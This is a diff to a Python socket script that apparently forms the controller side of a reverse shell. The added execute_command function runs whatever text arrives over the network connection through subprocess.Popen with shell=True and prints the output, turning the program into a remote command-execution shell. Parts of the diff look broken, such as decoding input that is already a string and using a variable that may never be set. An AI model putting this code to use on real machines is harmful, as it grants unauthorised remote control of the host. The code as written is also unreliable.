@@ -1,6 +1,7 @@
 import socket
 import sys
 import os
+import subprocess
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -39,9 +40,30 @@ def socket_accept():
     conn, address = s.accept()
     print("Connection has been established")
     print("IP: " + address[0] + "  |  Port: " + str(address[1]))
-    send_command(conn)
+    while True:
+        client_res = conn.recv(1024)
+        if client_res.decode("utf-8") == "quit":
+            conn.close()
+            s.close()
+            sys.exit()
+            break
+        execute_command(client_res, conn)
     
     conn.close()
+    
+def execute_command(cmd, conn):
+    if cmd[:2].decode("utf-8") == "cd":
+        os.chdir(cmd[3:])
+        
+    if len(cmd) > 0:
+        cmd = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, 
+                            stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte, "utf-8")
+        currentWD = os.getcwd() + "> "
+        # conn.send(str.encode(output_str + currentWD))
+
+    print(output_str)
 
 def send_command(conn):
     while True:
@@ -51,10 +73,22 @@ def send_command(conn):
             s.close()
             sys.exit()
             
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_res = str(conn.recv(1024), "utf-8")
-            print(client_res, end="")
+        if cmd[:2].decode("utf-8") == "cd":
+            os.chdir(cmd[3:].decode("utf-8"))
+            
+        
+            
+        if len(cmd) > 0:
+            cmd = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, 
+                                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte, "utf-8")
+            currentWD = os.getcwd() + "> "
+            conn.send(str.encode(output_str + currentWD))
+
+            print(output_str)
+            
+
             
 def main():
     create_socket()
